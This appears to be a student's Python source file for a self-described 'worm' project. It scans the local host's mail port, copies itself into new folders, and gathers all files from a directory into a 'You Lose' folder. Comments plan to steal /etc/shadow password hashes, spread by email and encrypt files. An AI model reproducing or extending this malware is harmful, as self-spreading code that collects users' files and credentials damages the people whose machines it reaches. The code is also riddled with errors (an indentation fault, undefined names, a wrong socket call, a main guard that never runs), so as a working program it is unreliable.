#The Beginning

# Worm 2021 Project By Mia Jenkins and Mentored by Deep Ramanayake

#import modules
import sys #allows for command line and creating files 
import os #allows us access for command line as well but more clear
import glob #helps with replication process and path finding 
import nmap #should allow me to pull from the nmap; may not use
import socket #should allow me to pull the ip address of the host machine of the virus
import platform #gives me system info
from sys import argv #uses arguments 
import subprocess #allows you to use terminal commands 
import shutil #allows use to do file movement


def portscan():
    #random issue
    #the following will scan to make sure the email port of the target is open allowing it to be sent through. if it is not open then it will not execute

    #first I need a target this takes the host name using socket
    target=socket.gethostname()


    #with help from Geek for Geek
    target_addy = socket.gethostbyname(target) #now we have the IP addess of the host machine

    #try making it into a list because we only want certain ports 
    #emailports = 

    #open scanner
    scanner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    #scan for the one port you need which is 587 since this is being sent via email and will move via email; state will hold the port status
    state = scanner.connect_ex(target_addy, 587)

    #if the port is 0 then it is open run next line
    if state == 0:
        print('Open!') #these are just fillers until I fix the other code
    else:
        #if its not then die
        print('oops') #these are just fillers until I fix the other code

    #close the socket idk just sounds safe
    scanner.close()

def wiggle():
    #the purpose of this function is to allow the worm to move and find files

    #first check the OS
    system = platform.system()

    #the computer is linux 
    if(system == "Linux"):
        #get the current location
        currentpath = os.path.abspath("worm.py")

        #need the username to properly get pathway names
        username = os.getlogin()

        #if the worm is in downloads
        if(os.path.isdir("/home/"+username+"/Downloads/")):
            take()
            copy()
           
            #should I send it to another location
        #if the worm is in Documents
         if(os.path.isdir("/home/"+username+"/Documents/")):
            take()
            copy()
           
        #if its not in any of those two locations this person is weird grab me the passwords
        else:
            #send the worm to the /etc and copy the shadow file but that may need addditional permissions
            #for right now just take whatever
            take()
            copy()

def copy():
    #going to copy the worm to the folder that it is currently in 

    #going to scan the folder to make sure it is not already copied
    os.path.exists("worm.py")

    #if it is in the directory
    if os.path.exists("worm.py"):
        print ("yes")

    else:
        #get the current location - do I Need the current location
        location = os.path.abspath(worm.py)

        #began the worm copy method
        script = arg

        #setting this to a name 
        name = str(script[0])

        #going to create the directory twice
        for i in range(0,1):
            directoryName = 'The Game'
            subprocess.call(['mkdir', directoryName])
            subprocess.call(['cp',name, directoryName])

def take():
    #the take method will create a file and send all the other files in that folder

    #get the current location
    location = os.path.abspath(worm.py)

    #create the folder there??
    directory = 'You Lose'
    subprocess.call(['mkdir', directory]) #this is my destination file

    #copy all of the files in that directory

    #i need to list all of the folder in a
    files = os.listdir(location)

    #then loop through all of those files
    for filename in files:
        #want to make the files a full pathway to properly copy
        full_name = os.path.join(location, filename)
        if os.isfile(full_name):

            #send all of those copies to a new file 
            shutil.copy(full_name, directory)

    #maybe encrypt the file idk



def main():
    wiggle()
    #do I need these here?
    #copy()
    #take()

if __name__=="_main_":
    main()

# The End 